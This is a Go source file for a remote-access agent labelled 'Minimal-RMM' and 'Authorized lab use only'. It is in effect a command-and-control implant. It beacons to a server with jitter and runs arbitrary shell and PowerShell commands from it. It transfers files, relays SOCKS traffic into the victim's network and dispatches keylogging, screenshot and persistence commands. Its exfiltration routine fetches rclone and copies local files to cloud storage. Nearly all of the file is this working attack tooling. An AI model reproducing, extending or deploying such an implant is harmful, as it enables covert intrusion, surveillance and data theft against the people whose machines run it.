// Minimal-RMM Go agent. Authorized lab use only.
//
// This agent deliberately uses the same polling protocol as client_rmm.ps1.
// It has no third-party dependencies so the server can produce reproducible
// cross-compiled binaries with CGO disabled.
package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

type config struct {
	BaseURL       string
	BeaconSecret  string
	SessionID     string
	HTTPProxy     string
	SleepSeconds  int
	JitterPercent int
	MaxRetries    int
}

type commandResponse struct {
	Command     string `json:"command"`
	Type        string `json:"type"`
	SocksActive bool   `json:"socks_active"`
}

type socksPollResponse struct {
	Active bool        `json:"active"`
	Tasks  []socksTask `json:"tasks"`
}

type socksTask struct {
	Op      string `json:"op"`
	ID      string `json:"id"`
	Host    string `json:"host"`
	Port    int    `json:"port"`
	DataB64 string `json:"data_b64"`
}

type socksResponse struct {
	ID      string `json:"id"`
	Op      string `json:"op"`
	DataB64 string `json:"data_b64,omitempty"`
	Msg     string `json:"msg,omitempty"`
}

type socksRelay struct {
	mu       sync.Mutex
	active   bool
	conns    map[string]net.Conn
	stopping chan struct{}
}

type exfilJob struct {
	LocalPath   string            `json:"local_path"`
	Profile     string            `json:"profile"`
	Backend     string            `json:"backend"`
	Dest        string            `json:"dest"`
	RemoteName  string            `json:"remote_name"`
	LinkCommand bool              `json:"link_command"`
	RcloneURL   string            `json:"rclone_url"`
	Env         map[string]string `json:"env"`
}

// These values are injected by the authenticated server build endpoint. They
// are encoded to keep linker arguments safe; environment variables override
// them at runtime.
var (
	defaultBaseURLB64       string
	defaultBeaconSecretB64  string
	defaultSessionIDB64     string
	defaultHTTPProxyB64     string
	defaultSleepSecondsB64  string
	defaultJitterPercentB64 string
	logMu                   sync.Mutex
	logFile                 *os.File
)

func main() {
	initAgentLog()
	cfg, err := loadConfig()
	if err != nil {
		logf("configuration error: %v", err)
		os.Exit(2)
	}
	logf("starting agent for %s", cfg.BaseURL)
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	client := newHTTPClient(cfg)
	relay := newSocksRelay()
	go relay.loop(client, cfg)

	for {
		if err := register(client, cfg); err != nil {
			if isSessionTerminatedError(err) {
				logf("session terminated by server")
				return
			}
			logf("register failed: %v", err)
			sleepWithJitter(cfg, rng)
			continue
		}
		if err := pollOnce(client, cfg, relay); err != nil {
			if err.Error() == "session terminated by server" {
				return
			}
			logf("poll failed: %v", err)
		}
		sleepWithJitter(cfg, rng)
	}
}

func isSessionTerminatedError(err error) bool {
	return err != nil && strings.Contains(strings.ToUpper(err.Error()), "TERMINATED")
}

func loadConfig() (*config, error) {
	cfg := &config{
		BaseURL:       strings.TrimRight(envOr("RMM_BASE_URL", embeddedValue(defaultBaseURLB64)), "/"),
		BeaconSecret:  envOr("RMM_BEACON_SECRET", embeddedValue(defaultBeaconSecretB64)),
		SessionID:     envOr("RMM_SESSION_ID", embeddedValue(defaultSessionIDB64)),
		HTTPProxy:     strings.TrimSpace(envOr("RMM_HTTP_PROXY", embeddedValue(defaultHTTPProxyB64))),
		SleepSeconds:  envInt("RMM_SLEEP_SECONDS", envIntValue(defaultSleepSecondsB64, 60)),
		JitterPercent: envInt("RMM_JITTER_PERCENT", envIntValue(defaultJitterPercentB64, 30)),
		MaxRetries:    envInt("RMM_MAX_RETRIES", 3),
	}
	if cfg.BaseURL == "" || cfg.BeaconSecret == "" {
		return nil, errors.New("RMM_BASE_URL and RMM_BEACON_SECRET are required")
	}
	if cfg.SessionID == "" {
		// The server accepts only token-safe session IDs. Hostnames may contain
		// dots, so do not use the raw hostname as the identifier.
		cfg.SessionID = fmt.Sprintf("go-%d", time.Now().UnixNano())
	}
	if cfg.SleepSeconds < 1 {
		cfg.SleepSeconds = 1
	}
	if cfg.JitterPercent < 0 {
		cfg.JitterPercent = 0
	}
	if cfg.JitterPercent > 100 {
		cfg.JitterPercent = 100
	}
	return cfg, nil
}

func register(client *http.Client, cfg *config) error {
	v := values(cfg)
	v.Set("h", hostname())
	v.Set("u", username())
	v.Set("s", strconv.Itoa(cfg.SleepSeconds))
	v.Set("j", strconv.Itoa(cfg.JitterPercent))
	v.Set("sync", "1")
	_, err := request(client, cfg, http.MethodGet, "/register", v, nil)
	return err
}

func pollOnce(client *http.Client, cfg *config, relay *socksRelay) error {
	data, err := request(client, cfg, http.MethodGet, "/cmd", values(cfg), nil)
	if err != nil {
		return err
	}
	var reply commandResponse
	if err := json.Unmarshal(data, &reply); err != nil {
		return err
	}
	relay.setActive(reply.SocksActive)
	if strings.TrimSpace(reply.Command) == "" {
		_ = register(client, cfg)
		return nil
	}
	if strings.HasPrefix(strings.TrimSpace(reply.Command), "__DOWNLOAD__ ") {
		if err := sendFileDownload(client, cfg, strings.TrimSpace(strings.TrimPrefix(strings.TrimSpace(reply.Command), "__DOWNLOAD__ "))); err != nil {
			_ = sendTextResult(client, cfg, reply.Command, "Download failed: "+err.Error())
		}
		_ = register(client, cfg)
		return nil
	}
	if strings.TrimSpace(reply.Command) == "__EXIT__" {
		return errors.New("session terminated by server")
	}
	output, resultType := execute(reply.Command, cfg, client)
	query := values(cfg)
	query.Set("type", resultType)
	_, err = request(client, cfg, http.MethodPost, "/result", query, []byte(output))
	_ = register(client, cfg)
	return err
}

func newHTTPClient(cfg *config) *http.Client {
	transport := &http.Transport{}
	if cfg.HTTPProxy != "" {
		if proxyURL, err := url.Parse(cfg.HTTPProxy); err == nil && proxyURL.Scheme != "" && proxyURL.Host != "" {
			transport.Proxy = http.ProxyURL(proxyURL)
		}
	}
	return &http.Client{Timeout: 90 * time.Second, Transport: transport}
}

func newSocksRelay() *socksRelay {
	return &socksRelay{conns: make(map[string]net.Conn), stopping: make(chan struct{})}
}

func (r *socksRelay) setActive(active bool) {
	r.mu.Lock()
	wasActive := r.active
	r.active = active
	if !active && wasActive {
		for id, conn := range r.conns {
			_ = conn.Close()
			delete(r.conns, id)
		}
	}
	r.mu.Unlock()
}

func (r *socksRelay) loop(client *http.Client, cfg *config) {
	ticker := time.NewTicker(25 * time.Millisecond)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			r.mu.Lock()
			active := r.active
			r.mu.Unlock()
			if active {
				r.cycle(client, cfg)
			}
		case <-r.stopping:
			return
		}
	}
}

func (r *socksRelay) cycle(client *http.Client, cfg *config) {
	data, err := request(client, cfg, http.MethodGet, "/socks", values(cfg), nil)
	if err != nil {
		return
	}
	var poll socksPollResponse
	if json.Unmarshal(data, &poll) != nil {
		return
	}
	if !poll.Active {
		r.setActive(false)
		return
	}
	responses := make([]socksResponse, 0)
	for _, task := range poll.Tasks {
		if task.ID == "" {
			continue
		}
		switch task.Op {
		case "connect":
			conn, err := net.DialTimeout("tcp", net.JoinHostPort(task.Host, strconv.Itoa(task.Port)), 20*time.Second)
			if err != nil {
				responses = append(responses, socksResponse{ID: task.ID, Op: "error", Msg: err.Error()})
				continue
			}
			conn.(*net.TCPConn).SetNoDelay(true)
			r.mu.Lock()
			if old := r.conns[task.ID]; old != nil {
				_ = old.Close()
			}
			r.conns[task.ID] = conn
			r.mu.Unlock()
			responses = append(responses, socksResponse{ID: task.ID, Op: "ok"})
		case "send":
			r.mu.Lock()
			conn := r.conns[task.ID]
			r.mu.Unlock()
			if conn == nil {
				continue
			}
			raw, decodeErr := base64.StdEncoding.DecodeString(task.DataB64)
			_, writeErr := conn.Write(raw)
			if decodeErr != nil || writeErr != nil {
				r.close(task.ID)
				responses = append(responses, socksResponse{ID: task.ID, Op: "closed"})
			}
		case "close":
			r.close(task.ID)
		}
	}
	for id, conn := range r.snapshot() {
		for i := 0; i < 4; i++ {
			_ = conn.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
			buf := make([]byte, 16*1024)
			n, readErr := conn.Read(buf)
			if n > 0 {
				responses = append(responses, socksResponse{ID: id, Op: "data", DataB64: base64.StdEncoding.EncodeToString(buf[:n])})
			}
			if readErr != nil {
				if errors.Is(readErr, os.ErrDeadlineExceeded) {
					break
				}
				r.close(id)
				responses = append(responses, socksResponse{ID: id, Op: "closed"})
				break
			}
		}
	}
	if len(responses) > 0 {
		body, _ := json.Marshal(map[string]any{"responses": responses})
		_, _ = request(client, cfg, http.MethodPost, "/socks", values(cfg), body)
	}
}

func (r *socksRelay) snapshot() map[string]net.Conn {
	r.mu.Lock()
	defer r.mu.Unlock()
	out := make(map[string]net.Conn, len(r.conns))
	for id, conn := range r.conns {
		out[id] = conn
	}
	return out
}

func (r *socksRelay) close(id string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if conn := r.conns[id]; conn != nil {
		_ = conn.Close()
		delete(r.conns, id)
	}
}

func execute(command string, cfg *config, client *http.Client) (string, string) {
	trimmed := strings.TrimSpace(command)
	if strings.HasPrefix(trimmed, "__CONFIG__ ") {
		parts := strings.Fields(trimmed)
		if len(parts) >= 2 {
			if n, err := strconv.Atoi(parts[1]); err == nil && n > 0 {
				cfg.SleepSeconds = n
			}
		}
		if len(parts) >= 3 {
			if n, err := strconv.Atoi(parts[2]); err == nil && n >= 0 && n <= 100 {
				cfg.JitterPercent = n
			}
		}
		return fmt.Sprintf("sleep=%d jitter=%d", cfg.SleepSeconds, cfg.JitterPercent), "config_ack"
	}
	if trimmed == "__STOP__" || trimmed == "__EXIT__" {
		return "Go agent does not terminate from a queued command; stop its process on the host.", "output"
	}
	if strings.HasPrefix(trimmed, "__DOWNLOAD__ ") {
		result, _ := downloadFile(strings.TrimSpace(strings.TrimPrefix(trimmed, "__DOWNLOAD__ ")))
		return result, "file_upload"
	}
	if strings.HasPrefix(trimmed, "__UPLOAD__ ") {
		result, _ := uploadFile(trimmed)
		return result, "output"
	}
	if strings.HasPrefix(trimmed, "__SCREENSHOT__") {
		result, err := captureScreenshot()
		if err != nil {
			return "Screenshot failed: " + err.Error(), "output"
		}
		return result, "screenshot"
	}
	if strings.HasPrefix(trimmed, "__KEYLOG__ ") {
		result, resultType, err := keylogAction(strings.TrimSpace(strings.TrimPrefix(trimmed, "__KEYLOG__ ")))
		if err != nil {
			return "Keylogger failed: " + err.Error(), "output"
		}
		return result, resultType
	}
	if trimmed == "__INSTALL_PERSIST__" || trimmed == "__REMOVE_PERSIST__" {
		result, err := persistenceAction(trimmed == "__INSTALL_PERSIST__", cfg)
		if err != nil {
			return "Persistence failed: " + err.Error(), "output"
		}
		return result, "output"
	}
	if strings.HasPrefix(trimmed, "__EXFIL__") {
		result, err := exfiltrate(trimmed, cfg, client)
		if err != nil {
			return err.Error(), "output"
		}
		return result, "cloud_upload"
	}
	return runCommand(trimmed)
}

func runCommand(command string) (string, string) {
	var name string
	var args []string
	switch {
	case strings.HasPrefix(command, "PS: ") || strings.HasPrefix(command, "powershell: "):
		if runtime.GOOS != "windows" {
			return "PowerShell is unavailable on this target.", "output"
		}
		name, args = "powershell.exe", []string{"-NoProfile", "-NonInteractive", "-Command", command[strings.Index(command, ":")+1:]}
	case strings.HasPrefix(command, "pwsh: "):
		name, args = "pwsh", []string{"-NoProfile", "-NonInteractive", "-Command", command[6:]}
	default:
		if runtime.GOOS == "windows" {
			name, args = "cmd.exe", []string{"/d", "/c", command}
		} else {
			name, args = "/bin/sh", []string{"-c", command}
		}
	}
	out, err := newCommand(name, args...).CombinedOutput()
	if err != nil {
		return string(out) + "\n" + err.Error(), "output"
	}
	return string(out), "output"
}

func downloadFile(path string) (string, string) {
	data, err := os.ReadFile(path)
	if err != nil {
		return err.Error(), "output"
	}
	payload, _ := json.Marshal(map[string]any{
		"filename": filepath.Base(path), "remote_path": path,
		"content": base64.StdEncoding.EncodeToString(data), "eof": true,
	})
	return string(payload), "file_upload"
}

func sendFileDownload(client *http.Client, cfg *config, path string) error {
	file, err := os.Open(path)
	if err != nil {
		return err
	}
	defer file.Close()
	info, err := file.Stat()
	if err != nil {
		return err
	}
	if info.IsDir() {
		return errors.New("path is a directory")
	}
	uploadID := fmt.Sprintf("%d-%d", time.Now().UnixNano(), os.Getpid())
	const chunkSize = 2 * 1024 * 1024
	var offset int64
	for {
		chunk := make([]byte, chunkSize)
		n, readErr := file.Read(chunk)
		if readErr != nil && !errors.Is(readErr, io.EOF) {
			return readErr
		}
		eof := offset+int64(n) >= info.Size()
		if info.Size() == 0 {
			eof = true
		}
		payload, _ := json.Marshal(map[string]any{
			"filename": filepath.Base(path), "remote_path": path,
			"upload_id": uploadID, "offset": offset, "eof": eof,
			"content": base64.StdEncoding.EncodeToString(chunk[:n]),
		})
		query := values(cfg)
		query.Set("type", "file_upload")
		if _, err := request(client, cfg, http.MethodPost, "/result", query, payload); err != nil {
			return err
		}
		offset += int64(n)
		if eof || readErr == io.EOF {
			return nil
		}
	}
}

func sendTextResult(client *http.Client, cfg *config, command, output string) error {
	payload, _ := json.Marshal(map[string]string{"rmm_cmd": command, "rmm_output": output})
	return func() error {
		_, err := request(client, cfg, http.MethodPost, "/result", values(cfg), payload)
		return err
	}()
}

func uploadFile(command string) (string, string) {
	parts := strings.SplitN(command, "\n", 2)
	if len(parts) != 2 {
		return "invalid __UPLOAD__ payload", "output"
	}
	path := strings.TrimSpace(strings.TrimPrefix(parts[0], "__UPLOAD__ "))
	var payload struct {
		Content     string `json:"content"`
		Filename    string `json:"filename"`
		SrcFilename string `json:"src_filename"`
	}
	if err := json.Unmarshal([]byte(parts[1]), &payload); err != nil {
		return err.Error(), "output"
	}
	data, err := base64.StdEncoding.DecodeString(payload.Content)
	if err != nil {
		return err.Error(), "output"
	}
	if strings.HasSuffix(path, string(os.PathSeparator)) || strings.HasSuffix(path, "/") || strings.HasSuffix(path, "\\") {
		name := payload.SrcFilename
		if name == "" {
			name = payload.Filename
		}
		if name == "" {
			return "destination directory has no filename", "output"
		}
		path = filepath.Join(strings.TrimRight(path, `/\`), filepath.Base(name))
	}
	if info, statErr := os.Stat(path); statErr == nil && info.IsDir() {
		name := payload.SrcFilename
		if name == "" {
			name = payload.Filename
		}
		if name == "" {
			return "destination directory has no filename", "output"
		}
		path = filepath.Join(path, filepath.Base(name))
	}
	if parent := filepath.Dir(path); parent != "." {
		if err := os.MkdirAll(parent, 0700); err != nil {
			return err.Error(), "output"
		}
	}
	if err := os.WriteFile(path, data, 0600); err != nil {
		return err.Error(), "output"
	}
	return "uploaded " + path, "output"
}

func exfiltrate(command string, cfg *config, client *http.Client) (string, error) {
	parts := strings.SplitN(command, "\n", 2)
	if len(parts) != 2 {
		return "", errors.New("Exfil failed: missing JSON payload")
	}
	var job exfilJob
	if err := json.Unmarshal([]byte(parts[1]), &job); err != nil {
		return "", fmt.Errorf("Exfil failed: %w", err)
	}
	info, err := os.Stat(job.LocalPath)
	if err != nil {
		return cloudUploadResult(job, false, 0, err.Error()), nil
	}
	rclone, err := exec.LookPath("rclone")
	if err != nil {
		rclone, err = downloadRclone(client, cfg, job.RcloneURL)
		if err != nil {
			return cloudUploadResult(job, false, info.Size(), err.Error()), nil
		}
	}
	if job.RemoteName == "" {
		job.RemoteName = "RMM"
	}
	target := job.RemoteName + ":" + job.Dest
	mode := "copyto"
	if info.IsDir() {
		mode = "copy"
	}
	args := []string{mode, job.LocalPath, target}
	if runtime.GOOS == "windows" {
		args = append(args, "--config", "NUL")
	}
	cmd := exec.Command(rclone, args...)
	cmd.Env = os.Environ()
	for key, value := range job.Env {
		cmd.Env = append(cmd.Env, key+"="+value)
	}
	output, runErr := cmd.CombinedOutput()
	if runErr != nil {
		return cloudUploadResult(job, false, info.Size(), strings.TrimSpace(string(output))), nil
	}
	link := ""
	if job.LinkCommand && !info.IsDir() {
		linkArgs := []string{"link", target}
		if runtime.GOOS == "windows" {
			linkArgs = append(linkArgs, "--config", "NUL")
		}
		if linkOut, linkErr := exec.Command(rclone, linkArgs...).CombinedOutput(); linkErr == nil {
			link = strings.TrimSpace(string(linkOut))
		}
	}
	return cloudUploadResultWithLink(job, true, info.Size(), "", link), nil
}

func downloadRclone(client *http.Client, cfg *config, relativeURL string) (string, error) {
	if relativeURL == "" {
		relativeURL = "/tools/rclone.exe"
	}
	data, err := request(client, cfg, http.MethodGet, relativeURL, values(cfg), nil)
	if err != nil {
		return "", fmt.Errorf("rclone bootstrap failed: %w", err)
	}
	name := "minimal-rmm-rclone"
	if runtime.GOOS == "windows" {
		name += ".exe"
	}
	path := filepath.Join(os.TempDir(), name)
	if err := os.WriteFile(path, data, 0700); err != nil {
		return "", fmt.Errorf("rclone bootstrap write failed: %w", err)
	}
	if runtime.GOOS != "windows" {
		if err := os.Chmod(path, 0700); err != nil {
			return "", fmt.Errorf("rclone bootstrap permissions failed: %w", err)
		}
	}
	return path, nil
}

func cloudUploadResult(job exfilJob, success bool, size int64, failure string) string {
	return cloudUploadResultWithLink(job, success, size, failure, "")
}

func cloudUploadResultWithLink(job exfilJob, success bool, size int64, failure, link string) string {
	payload := map[string]any{"remote_path": job.LocalPath, "profile": job.Profile, "backend": job.Backend, "success": success, "link": link, "dest": job.Dest, "size": size, "error": failure}
	data, _ := json.Marshal(payload)
	return string(data)
}

func request(client *http.Client, cfg *config, method, endpoint string, query url.Values, body []byte) ([]byte, error) {
	u := cfg.BaseURL + endpoint + "?" + query.Encode()
	var reader io.Reader
	if body != nil {
		reader = bytes.NewReader(body)
	}
	req, err := http.NewRequest(method, u, reader)
	if err != nil {
		return nil, err
	}
	req.Header.Set("X-RMM-Beacon-Token", cfg.BeaconSecret)
	if body != nil {
		contentType := "text/plain; charset=utf-8"
		if endpoint == "/socks" || query.Get("type") == "file_upload" || query.Get("type") == "output" {
			contentType = "application/json; charset=utf-8"
		}
		req.Header.Set("Content-Type", contentType)
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	data, readErr := io.ReadAll(resp.Body)
	if readErr != nil {
		return nil, readErr
	}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, strings.TrimSpace(string(data)))
	}
	return data, nil
}

func values(cfg *config) url.Values { v := url.Values{}; v.Set("id", cfg.SessionID); return v }
func hostname() string {
	h, _ := os.Hostname()
	if h == "" {
		return "unknown"
	}
	return h
}
func username() string {
	if u := os.Getenv("USERNAME"); u != "" {
		return u
	}
	if u := os.Getenv("USER"); u != "" {
		return u
	}
	return "unknown"
}
func envOr(name, fallback string) string {
	if v := os.Getenv(name); v != "" {
		return v
	}
	return fallback
}
func envInt(name string, fallback int) int {
	n, err := strconv.Atoi(os.Getenv(name))
	if err != nil {
		return fallback
	}
	return n
}
func embeddedValue(value string) string {
	if value == "" {
		return ""
	}
	decoded, err := base64.StdEncoding.DecodeString(value)
	if err != nil {
		return ""
	}
	return string(decoded)
}
func envIntValue(value string, fallback int) int {
	return envIntValueString(embeddedValue(value), fallback)
}
func envIntValueString(value string, fallback int) int {
	n, err := strconv.Atoi(value)
	if err != nil {
		return fallback
	}
	return n
}
func sleepWithJitter(cfg *config, rng *rand.Rand) {
	delay := cfg.SleepSeconds
	if cfg.JitterPercent > 0 {
		delta := delay * cfg.JitterPercent / 100
		delay += rng.Intn(2*delta+1) - delta
		if delay < 1 {
			delay = 1
		}
	}
	time.Sleep(time.Duration(delay) * time.Second)
}
func logf(format string, args ...any) {
	line := fmt.Sprintf("[minimal-rmm-go] "+format+"\n", args...)
	_, _ = fmt.Fprint(os.Stderr, line)
	logMu.Lock()
	defer logMu.Unlock()
	if logFile != nil {
		_, _ = logFile.WriteString(line)
		_ = logFile.Sync()
	}
}

func initAgentLog() {
	path := envOr("RMM_LOG_FILE", filepath.Join(os.TempDir(), "minimal-rmm-agent.log"))
	file, err := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err == nil {
		logFile = file
	}
}
